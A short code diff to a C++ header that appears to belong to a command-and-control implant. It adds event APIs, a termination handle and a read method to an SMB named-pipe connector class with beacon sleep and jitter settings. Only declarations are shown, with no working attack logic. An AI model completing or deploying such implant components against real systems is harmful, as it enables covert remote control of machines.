@@ -53,6 +53,10 @@ struct SMBFUNC {
 	DECL_API(CreateNamedPipeA);
 	DECL_API(FlushFileBuffers);
 	DECL_API(PeekNamedPipe);
+	DECL_API(CreateEventA);
+	DECL_API(SetEvent);
+	DECL_API(ResetEvent);
+	DECL_API(WaitForMultipleObjects);
 
 	//advapi32
 	DECL_API(AllocateAndInitializeSid);
@@ -78,6 +82,9 @@ class ConnectorSMB : public Connector
 	ULONG beatSize = 0;
 	BOOL  connected = FALSE;
 
+	HANDLE hTermEvent = nullptr;
+	BOOL   dataReady  = FALSE;
+
 public:
 	ConnectorSMB();
 
@@ -92,13 +99,14 @@ public:
 	int   RecvSize() override;
 	void  RecvClear() override;
 
-	void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput) override {}
+	void Sleep(HANDLE wakeupEvent, ULONG workingSleep, ULONG sleepDelay, ULONG jitter, BOOL hasOutput) override;
 
 	static void* operator new(size_t sz);
 	static void operator delete(void* p) noexcept;
 
 private:
 	void SendData(BYTE* data, ULONG data_size);
+	void ReadIncoming();
 	void Listen();
 	void DisconnectInternal();
 };
